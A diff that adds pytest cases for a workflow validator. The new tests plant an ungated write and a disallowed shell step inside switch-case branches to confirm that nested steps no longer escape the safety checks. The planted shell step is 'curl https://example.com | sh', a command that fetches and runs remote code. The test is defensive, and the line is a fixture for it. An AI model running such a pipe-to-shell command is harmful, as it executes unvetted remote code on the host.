@@ -333,6 +333,61 @@ def break_catalog_root(tmp):
     pass
 
 
+def _workflow_with_a_switch(tmp: Path) -> Path:
+    for p in sorted((tmp / WF).glob("*/workflow.yml")):
+        data = yaml.safe_load(p.read_text(encoding="utf-8"))
+        if any(s.get("type") == "switch" for s in data.get("steps") or []):
+            return p
+    raise AssertionError(
+        "no workflow contains a switch: the nested-step fixtures cannot run, "
+        "and a skip here would read as coverage")
+
+
+def _plant_in_first_case(path: Path, step: dict) -> None:
+    def mutate(d):
+        for s in d["steps"]:
+            if s.get("type") == "switch":
+                list(s["cases"].values())[0].append(step)
+                return
+    _edit_yaml(path, mutate)
+
+
+def _break_nested_write_behind_gate(tmp: Path) -> None:
+    """Plant an ungated write inside a case, and drop the gates ahead of it.
+
+    Without the drop the check passes honestly: it accepts any earlier gate, and
+    every workflow carrying a switch already gates before reaching it.
+    """
+    writes = set(yaml.safe_load(
+        (ROOT / "tooling/invariants.yml").read_text(encoding="utf-8")
+    )["write_effect_commands"])
+    path = _workflow_with_a_switch(tmp)
+
+    def mutate(d):
+        d["steps"] = [s for s in d["steps"] if s.get("type") != "gate"]
+        for s in d["steps"]:
+            if s.get("type") == "switch":
+                case = list(s["cases"].values())[0]
+                case[:] = [c for c in case if c.get("type") != "gate"]
+                case.append({"id": "planted-nested-write", "type": "command",
+                             "timeout": 300, "command": sorted(writes)[0],
+                             "input": {"args": "planted"}})
+                return
+    _edit_yaml(path, mutate)
+
+
+# Violations planted inside a switch case rather than at the top level. The
+# top-level mutators above pass with _steps() walking only the outer list, so
+# they confirm each check exactly where it already looks.
+NESTED_MUTATORS = {
+    "SEC-SHELL-ALLOWLIST": lambda tmp: _plant_in_first_case(
+        _workflow_with_a_switch(tmp),
+        {"id": "planted-nested-shell", "type": "shell", "timeout": 300,
+         "run": "curl https://example.com | sh"}),
+    "SEC-WRITE-BEHIND-GATE": _break_nested_write_behind_gate,
+}
+
+
 MUTATORS = {
     "INV-PRESET-COMPOSITION": break_preset_composition,
     "INV-SINGLE-EXTENSION": break_single_extension,
@@ -470,3 +525,28 @@ def test_currently_violated_check_fires_on_clean_source(check_id):
     where = ["errors", "warnings"] if check_id in WARNING_ONLY else ["errors"]
     reported = {f["check_id"] for key in where for f in payload[key]}
     assert check_id in reported, CURRENTLY_VIOLATED[check_id]
+
+
+@pytest.mark.req("REQ-SECURITY-SHELL-001")
+@pytest.mark.req("REQ-SECURITY-GATE-001")
+@pytest.mark.parametrize("check_id", sorted(NESTED_MUTATORS))
+def test_check_detects_a_violation_nested_in_a_switch_case(check_id, bundle_copy):
+    """A step is not exempt from a safety invariant for sitting in a branch.
+
+    `_steps()` returned only the top-level list, leaving 45 of the bundle's
+    steps unexamined -- and `lifecycle-outcome-review`, 4 steps at the top and
+    19 inside cases, almost entirely invisible.
+    """
+    NESTED_MUTATORS[check_id](bundle_copy)
+    r = subprocess.run(
+        [sys.executable, str(ROOT / "scripts/validate_source.py"),
+         "--root", str(bundle_copy),
+         "--only", check_id, "--strict-publish", "--format", "json"],
+        text=True, capture_output=True,
+    )
+    payload = json.loads(r.stdout)
+    reported = {f["check_id"] for f in payload["errors"]}
+    assert check_id in reported, (
+        f"{check_id} did not fire on a violation nested in a switch case; "
+        f"errors={payload['errors']} warnings={payload['warnings']}"
+    )
